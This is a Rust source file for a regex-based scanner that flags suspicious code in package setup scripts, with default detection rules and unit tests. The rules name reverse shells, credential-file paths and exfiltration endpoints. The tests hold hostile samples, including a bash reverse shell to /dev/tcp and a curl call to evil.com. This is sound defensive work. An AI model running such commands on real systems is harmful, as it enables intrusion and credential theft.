use rayon::prelude::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// A single pattern match result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PatternMatch {
    pub rule_name: String,
    pub description: String,
    pub severity: String,
    pub file: String,
    pub line: usize,
    pub matched_text: String,
}

/// A compiled rule for pattern matching.
#[derive(Clone)]
struct CompiledRule {
    name: String,
    description: String,
    severity: String,
    patterns: Vec<Regex>,
}

/// Engine that loads rules and matches patterns against file content.
pub struct PatternEngine {
    rules: Vec<CompiledRule>,
    cache: HashMap<u64, Vec<PatternMatch>>,
}

/// A rule definition (loaded from YAML).
#[derive(Debug, Deserialize)]
pub struct RuleDefinition {
    pub name: String,
    pub description: String,
    pub severity: String,
    pub patterns: Vec<String>,
}

impl PatternEngine {
    pub fn new() -> Self {
        Self {
            rules: Vec::new(),
            cache: HashMap::new(),
        }
    }

    /// Load rules from YAML content.
    pub fn load_rules_yaml(&mut self, yaml_content: &str) -> Result<usize, String> {
        let definitions: Vec<RuleDefinition> =
            serde_yaml::from_str(yaml_content).map_err(|e| format!("YAML parse error: {e}"))?;

        let mut count = 0;
        for def in definitions {
            let mut compiled_patterns = Vec::new();
            for pattern in &def.patterns {
                match Regex::new(pattern) {
                    Ok(re) => compiled_patterns.push(re),
                    Err(e) => {
                        return Err(format!(
                            "Invalid regex in rule '{}': {}: {}",
                            def.name, pattern, e
                        ))
                    }
                }
            }

            self.rules.push(CompiledRule {
                name: def.name,
                description: def.description,
                severity: def.severity,
                patterns: compiled_patterns,
            });
            count += 1;
        }

        Ok(count)
    }

    /// Load default built-in rules.
    pub fn load_defaults(&mut self) {
        let default_rules = default_rules_yaml();
        let _ = self.load_rules_yaml(&default_rules);
    }

    /// Match patterns against file content.
    pub fn scan_content(&self, content: &str, filename: &str) -> Vec<PatternMatch> {
        let lines: Vec<&str> = content.lines().collect();

        self.rules
            .iter()
            .flat_map(|rule| {
                lines
                    .iter()
                    .enumerate()
                    .flat_map(|(line_no, line)| {
                        rule.patterns.iter().filter_map(move |pattern| {
                            pattern.find(line).map(|m| PatternMatch {
                                rule_name: rule.name.clone(),
                                description: rule.description.clone(),
                                severity: rule.severity.clone(),
                                file: filename.to_string(),
                                line: line_no + 1,
                                matched_text: m.as_str().to_string(),
                            })
                        })
                    })
                    .collect::<Vec<_>>()
            })
            .collect()
    }

    /// Scan multiple files in parallel using rayon.
    pub fn scan_files_parallel(
        &self,
        files: &[(String, String)], // (filename, content) pairs
    ) -> Vec<PatternMatch> {
        files
            .par_iter()
            .flat_map(|(filename, content)| self.scan_content(content, filename))
            .collect()
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }
}

impl Default for PatternEngine {
    fn default() -> Self {
        let mut engine = Self::new();
        engine.load_defaults();
        engine
    }
}

fn default_rules_yaml() -> String {
    r#"
- name: exec_eval
  description: "Dynamic code execution (exec/eval)"
  severity: high
  patterns:
    - '\bexec\s*\('
    - '\beval\s*\('

- name: subprocess_spawn
  description: "Subprocess/system command execution"
  severity: high
  patterns:
    - 'subprocess\.(call|run|Popen|check_output)\s*\('
    - 'os\.(system|popen|exec[lv]?p?e?)\s*\('
    - 'child_process\.(exec|spawn|fork)\s*\('

- name: network_io
  description: "Network I/O in install/setup scripts"
  severity: medium
  patterns:
    - 'requests\.(get|post|put|delete)\s*\('
    - 'urllib\.request\.urlopen\s*\('
    - 'http\.client\.HTTP'
    - 'socket\.socket\s*\('

- name: base64_decode
  description: "Base64 decoding (potential payload obfuscation)"
  severity: medium
  patterns:
    - 'base64\.(b64decode|decodebytes)\s*\('
    - 'atob\s*\('

- name: credential_files
  description: "Access to credential/config files"
  severity: critical
  patterns:
    - '\.ssh/(id_rsa|id_ed25519|authorized_keys|known_hosts)'
    - '\.aws/credentials'
    - '\.npmrc'
    - '\.pypirc'
    - '\.env'
    - '\.git/config'

- name: crypto_mining
  description: "Potential crypto mining indicators"
  severity: critical
  patterns:
    - '(?i)(stratum\+tcp|mining\.pool|coinhive|cryptonight)'
    - '(?i)(xmrig|monero|ethereum\.mining)'

- name: reverse_shell
  description: "Reverse shell patterns"
  severity: critical
  patterns:
    - '(?i)reverse.?shell'
    - '/bin/(ba)?sh\s+-i'
    - 'socket\.connect\s*\(\s*\('
    - 'nc\s+-[elp]'

- name: data_exfiltration
  description: "Potential data exfiltration"
  severity: high
  patterns:
    - '(?i)discord\.com/api/webhooks'
    - '(?i)api\.telegram\.org/bot'
    - '(?i)ngrok\.io'
    - 'https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
"#
    .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_load_defaults() {
        let engine = PatternEngine::default();
        assert!(engine.rule_count() > 0);
    }

    #[test]
    fn test_scan_exec() {
        let engine = PatternEngine::default();
        let matches = engine.scan_content("exec(compile(code, '<string>', 'exec'))", "setup.py");
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.rule_name == "exec_eval"));
    }

    #[test]
    fn test_scan_subprocess() {
        let engine = PatternEngine::default();
        let content = "subprocess.call(['curl', 'http://evil.com'])";
        let matches = engine.scan_content(content, "setup.py");
        assert!(matches.iter().any(|m| m.rule_name == "subprocess_spawn"));
    }

    #[test]
    fn test_scan_safe_code() {
        let engine = PatternEngine::default();
        let content = r#"
from setuptools import setup
setup(name="safe", version="1.0", packages=["safe"])
"#;
        let matches = engine.scan_content(content, "setup.py");
        assert!(matches.is_empty());
    }

    #[test]
    fn test_scan_credential_access() {
        let engine = PatternEngine::default();
        let content = "open(os.path.expanduser('~/.ssh/id_rsa'))";
        let matches = engine.scan_content(content, "malicious.py");
        assert!(matches.iter().any(|m| m.rule_name == "credential_files"));
    }

    #[test]
    fn test_scan_reverse_shell() {
        let engine = PatternEngine::default();
        let content = "/bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1";
        let matches = engine.scan_content(content, "evil.sh");
        assert!(!matches.is_empty());
    }

    #[test]
    fn test_parallel_scan() {
        let engine = PatternEngine::default();
        let files = vec![
            ("a.py".to_string(), "exec(code)".to_string()),
            ("b.py".to_string(), "print('hello')".to_string()),
            ("c.py".to_string(), "subprocess.call(['ls'])".to_string()),
        ];
        let matches = engine.scan_files_parallel(&files);
        assert!(matches.len() >= 2); // a.py and c.py should match
    }

    #[test]
    fn test_custom_rules() {
        let yaml = r#"
- name: test_rule
  description: "Test rule"
  severity: low
  patterns:
    - 'CUSTOM_PATTERN'
"#;
        let mut engine = PatternEngine::new();
        let count = engine.load_rules_yaml(yaml).unwrap();
        assert_eq!(count, 1);

        let matches = engine.scan_content("Found CUSTOM_PATTERN here", "test.py");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_name, "test_rule");
    }

    #[test]
    fn test_invalid_regex_error() {
        let yaml = r#"
- name: bad_rule
  description: "Bad rule"
  severity: low
  patterns:
    - '[invalid regex'
"#;
        let mut engine = PatternEngine::new();
        assert!(engine.load_rules_yaml(yaml).is_err());
    }
}
